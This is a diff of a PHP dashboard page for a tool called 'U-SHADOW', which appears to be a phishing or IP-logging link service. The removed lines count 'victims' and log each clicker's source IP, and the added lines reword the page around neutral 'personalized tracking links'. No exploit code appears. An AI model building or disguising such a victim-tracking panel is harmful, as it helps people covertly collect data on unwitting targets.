@@ -36,12 +36,7 @@ $top_hub = empty($cat_stats) ? 'N/A' : array_keys($cat_stats, max($cat_stats))[0
     <aside class="sidebar">
         <div class="sidebar-brand">U-SHADOW</div>
         <ul class="sidebar-menu">
-            <li><a href="dashboard.php" class="active"><i class="fa-solid fa-layer-group"></i> <span>Overview</span></a></li>
-            <li><a href="#hubs"><i class="fa-solid fa-link"></i> <span>Integration Hubs</span></a></li>
-            <li><a href="#analytics"><i class="fa-solid fa-chart-line"></i> <span>Analytics</span></a></li>
-            <?php if (isset($user['is_admin']) && $user['is_admin']): ?>
-                <li><a href="/admin/index.php"><i class="fa-solid fa-shield-halved"></i> <span>Admin Access</span></a></li>
-            <?php endif; ?>
+            <li><a href="dashboard.php" class="active"><i class="fa-solid fa-layer-group"></i> <span>Dashboard</span></a></li>
             <li style="margin-top: 100px;"><a href="/logout.php"><i class="fa-solid fa-right-from-bracket"></i> <span>Sign Out</span></a></li>
         </ul>
     </aside>
@@ -55,68 +50,13 @@ $top_hub = empty($cat_stats) ? 'N/A' : array_keys($cat_stats, max($cat_stats))[0
             <div class="page-title">
                 <h1>.: Dashboard :.</h1>
                 <p>Welcome back, <strong><?php echo s($user['username']); ?></strong>!</p>
-                <p style="font-size: 14px; color: var(--gray);">You can now access your victims and manage your account.</p>
-            </div>
-            <div class="user-nav" style="display: none;">
-                <div class="user-info">
-                    <span class="name"><?php echo s($user['username']); ?></span>
-                    <span class="role"><?php echo (isset($user['is_admin']) && $user['is_admin']) ? 'Administrator' : 'Professional Member'; ?></span>
-                </div>
-                <div class="avatar"><?php echo strtoupper(substr($user['username'], 0, 1)); ?></div>
             </div>
         </header>
 
-        <section class="stats-container" style="display: block;">
-            <div class="card-stat" style="margin-bottom: 20px;">
-                <h2 style="margin-top: 0; font-size: 20px;">Your Statistics</h2>
-                <div style="font-size: 16px; margin-bottom: 5px;">Victims: <?php echo $clicks_count; ?></div>
-                <div style="font-size: 16px;">Links generated: <?php echo count($categories); ?></div>
-            </div>
-            <div class="card-stat" style="display: none;">
-                <div class="label">Top Performance</div>
-                <div class="value"><?php echo s(ucfirst($top_hub)); ?></div>
-                <div class="trend up"><i class="fa-solid fa-fire"></i> Trending Hub</div>
-            </div>
-        </section>
-
-        <section id="analytics" class="section">
-            <div class="section-header">
-                <h2>Real-time Click Analytics</h2>
-            </div>
-            <div class="section-content">
-                <table class="custom-table">
-                    <thead>
-                        <tr>
-                            <th>Timestamp</th>
-                            <th>Platform Hub</th>
-                            <th>Source IP Address</th>
-                            <th>Recording Status</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <?php if ($clicks_count > 0): ?>
-                            <?php foreach (array_reverse(array_slice($user_analytics, -10)) as $click): ?>
-                                <tr>
-                                    <td><i class="fa-regular fa-clock" style="color: var(--gray); margin-right: 8px;"></i> <?php echo s($click['timestamp']); ?></td>
-                                    <td><strong class="text-primary"><?php echo s(ucfirst($click['category'])); ?></strong></td>
-                                    <td><code><?php echo s($click['source_ip']); ?></code></td>
-                                    <td><span class="badge badge-success">Success</span></td>
-                                </tr>
-                            <?php endforeach; ?>
-                        <?php else: ?>
-                            <tr>
-                                <td colspan="4" style="text-align: center; color: var(--gray); padding: 50px;">No analytics recorded yet. Copy your links below to start tracking.</td>
-                            </tr>
-                        <?php endif; ?>
-                    </tbody>
-                </table>
-            </div>
-        </section>
-
-        <section id="hubs" class="section">
-            <div class="section-header" style="display: block;">
-                <h2>Generate Links</h2>
-                <p style="font-size: 14px; color: var(--gray);">Select a category to generate your pitching link:</p>
+        <section class="section">
+            <div class="section-header" style="display: block; text-align: center; border-bottom: 1px solid #eee; padding-bottom: 20px; margin-bottom: 30px;">
+                <h2 style="font-size: 28px; color: var(--dark);">Dynamic Link Grid</h2>
+                <p style="font-size: 16px; color: var(--gray);">Select a category below to generate your personalized tracking link.</p>
             </div>
             <div class="section-content">
                 <div class="link-grid">
